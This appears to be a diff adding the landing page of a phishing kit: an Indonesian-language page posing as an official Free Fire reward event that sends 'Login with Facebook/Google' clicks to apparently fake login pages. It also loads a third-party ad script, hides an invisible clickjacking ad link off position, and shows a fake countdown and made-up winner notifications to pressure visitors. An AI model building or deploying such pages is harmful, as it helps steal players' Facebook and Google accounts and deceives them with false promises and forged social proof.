@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .container {
+            position: relative;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .background-image {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://i.ibb.co/sQksN5C/images-16.jpg');
+            background-size: cover;
+            filter: blur(2.5px); /* Optional: blur the background image */
+            z-index: -1;
+            animation: fadeIn 2s ease; /* Animasi masuk */
+        }
+
+        .login-box {
+            position: absolute;
+            width: 65%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            padding: 50px;
+            background-color: rgba(255, 255, 255, 0.5); /* Optional: add a semi-transparent white background */
+            border-radius: 10px;
+            animation: slideIn 2s ease; /* Animasi masuk */
+        }
+
+        .login-box, p {
+            color: #3d3d3dcd;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            color: #fff; /* Teks berwarna putih */
+            font-size: 24px; /* Ukuran teks diperbesar */
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5); /* Efek bayangan teks */
+        }
+
+        h3 {
+            color: #ffffff; /* Warna teks indikator waktu */
+            font-size: 16px; /* Ukuran teks */
+            margin-top: 10px; /* Jarak antara card login dan indikator waktu */
+        }
+
+        button {
+            display: block;
+            width: 200px;
+            padding: 10px;
+            margin: 10px auto;
+            border: none;
+            border-radius: 2.5px;
+            background-color: #3b5998; /* Facebook Blue */
+            outline: none;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease; /* Animasi perubahan warna latar belakang tombol */
+        }
+
+        button:hover {
+            background-color: #2d4373; /* Warna latar belakang tombol saat hover */
+        }
+
+        .google-login {
+            background-color: #db4437; /* Google Red */outline: none;
+        }
+
+        /* Animasi masuk */
+        @keyframes slideIn {
+            0% { opacity: 0; transform: translate(-50%, -60%); }
+            100% { opacity: 1; transform: translate(-50%, -50%); }
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+         .logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 0px;
+        }
+
+        /* Animasi notifikasi */
+        @keyframes slideInNotification {
+            0% { opacity: 0; transform: translateY(-100%); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes slideOutNotification {
+            0% { opacity: 1; transform: translateY(0); }
+            100% { opacity: 0; transform: translateY(-100%); }
+        }
+
+        .notification-container {
+            position: fixed;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 9999;
+        }
+
+        .notification {
+            background-color: rgba(0, 0, 0, 0.7);
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 5px;
+            animation: slideInNotification 1s ease-out;
+        }
+    </style>
+</head>
+<body>    
+    
+   
+<!-- iklan -->
+    <script type='text/javascript' src='//pl22365904.toprevenuegate.com/2a/c4/e4/2ac4e4e53c6554eef290e70f20af8641.js'></script>
+    <!-- iklan -->
+
+    
+    
+       
+     
+    <div class="container">
+        
+        <div class="background-image"></div>
+       <center><h2>Event resmi free fire login dan dapatkan hadiahnya</h2></center>
+       
+        
+     
+      <img src="https://i.ibb.co/wYR8wLP/1706492245130.png" alt="deskripsi-gambar" width="400" height="400" style="position: fixed; bottom: -20px; left: -60px; z-index: 9; pointer-events: none;">
+
+
+       
+    <section>
+       
+        <div class="login-box">
+            <img src="https://i.ibb.co/4ftWq8b/1706436607111.png" alt="Free Fire Logo" class="logo"> 
+            <h2>Login</h2>
+            <i><p>login dan dapatkan hadiah nya.</p></i>
+            
+          <button class="facebook-login" onclick="redirectRandomPage('facebook')">Login with Facebook</button>
+<button class="google-login" onclick="redirectRandomPage('google')">Login with Google</button>
+
+<script>
+  function redirectRandomPage(provider) {
+    // Tentukan tingkat hadiah untuk setiap link
+    const facebookLoginRate = 40; // Persentase kemungkinan munculnya link login Facebook
+    const facebookHadiahRate = 50; // Persentase kemungkinan munculnya link hadiah Facebook
+    const googleLoginRate = 40; // Persentase kemungkinan munculnya link login Google
+    const googleHadiahRate = 50; // Persentase kemungkinan munculnya link hadiah Google
+
+    // Hitung total tingkat hadiah untuk setiap penyedia
+    const totalFacebookRate = facebookLoginRate + facebookHadiahRate;
+    const totalGoogleRate = googleLoginRate + googleHadiahRate;
+
+    // Generate bilangan acak antara 1 dan total tingkat hadiah untuk setiap penyedia
+    const randomFacebook = Math.floor(Math.random() * totalFacebookRate) + 1;
+    const randomGoogle = Math.floor(Math.random() * totalGoogleRate) + 1;
+
+    // Tentukan halaman yang akan ditampilkan berdasarkan bilangan acak
+    let selectedPage;
+    if (provider === 'facebook') {
+      if (randomFacebook <= facebookLoginRate) {
+        selectedPage = 'facebook.html';
+      } else {
+        selectedPage = 'hadiah.html';
+      }
+    } else if (provider === 'google') {
+      if (randomGoogle <= googleLoginRate) {
+        selectedPage = 'google.html';
+      } else {
+        selectedPage = 'hadiah.html';
+      }
+    }
+
+    // Arahkan pengguna ke halaman yang dipilih
+    window.location.href = 'Halaman/' + selectedPage;
+  }
+</script>
+
+
+            
+        </div>
+        
+       <center><h3 id="timeLeft"></h3></center>
+    </div>
+<!-- iklan -->
+<style>
+    .advertisement {
+        position: relative;
+        padding: 0px;
+        background-color: rgba(249, 249, 249, 0.6); /* Ubah nilai alpha untuk membuatnya lebih atau kurang transparan */
+        text-align: center;
+        font-family: Arial, sans-serif;
+        font-size: 14px;
+        opacity: 0; /* Atur tingkat transparansi di sini (0-1) */
+        margin-top: 0px;
+        height: 80px; /* Tinggi container iklan */
+    }
+    
+    .advertisement a {
+        position: absolute;
+        display: block;
+        width: 100%;
+        height: 180px; /* Tinggi link */
+        top: -481px; /* Atur jarak dari bagian atas container iklan */
+        z-index: 0; /* Mengatur lapisan tumpukan */
+    }
+</style>
+
+<div class="advertisement" id="advertisement">
+    <a href="https://www.toprevenuegate.com/zeehhsnwkj?key=ec108421c3ce55d08b11ac2a96363af9" onclick="return handleClick()"> <!-- Contoh: Warna latar belakang -->
+       
+    </a>
+</div>
+<!-- iklan -->
+
+    <div class="notification-container" id="notificationContainer"></div>
+   
+
+    <script>
+        // Hitung waktu yang tersisa dalam 2 hari
+        var endTime = new Date();
+        endTime.setDate(endTime.getDate() + 2); // Tambahkan 2 hari
+        var countdownInterval = setInterval(function() {
+            var now = new Date().getTime();
+            var distance = endTime - now;
+            if (distance <= 0) {
+                clearInterval(countdownInterval);
+                document.getElementById("timeLeft").innerHTML = "Event telah berakhir!";
+            } else {
+                var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                document.getElementById("timeLeft").innerHTML = "Event berakhir dalam " + days + " hari " + hours + " jam " + minutes + " menit " + seconds + " detik";
+            }
+        }, 1000);
+
+        // Array of winners and diamonds
+        var winners =
+        ["John","Emma","Daniel","Sophia","ᴾᴿᴼⓞ₦Ї","๖ۣۜ𝓟𝓡𝜣►_◄𝜣A*D𝓔🔥😎","ᏤᎪᏒᎶᎪᏚ","『𝓴𝓲𝓷𝓰』", "ᴾᴿᴼJrocks"];
+        var diamonds = [140, 50, 10, 70, 5];
+        
+
+function generateNotification() {
+            var randomWinnerIndex = Math.floor(Math.random() * winners.length);
+            var randomDiamondIndex = Math.floor(Math.random() * diamonds.length);
+            var winner = winners[randomWinnerIndex];
+            var diamond = diamonds[randomDiamondIndex];
+            var notification = document.createElement("div");
+            notification.className = "notification";
+            notification.innerHTML = "Selamat kepada " + winner + " telah mendapatkan " + diamond + " diamond!";
+            document.getElementById("notificationContainer").appendChild(notification);
+            setTimeout(function() {
+                notification.style.animation = "slideOutNotification 1s ease-out";
+                setTimeout(function() {
+                    notification.parentNode.removeChild(notification);
+                }, 1000);
+            }, 2000);
+        }
+
+        // Automatically generate notification every 10 seconds
+        setInterval(function() {
+            generateNotification();
+        }, 3500);
+    </script>
+</body>
+</html>
+
+ 
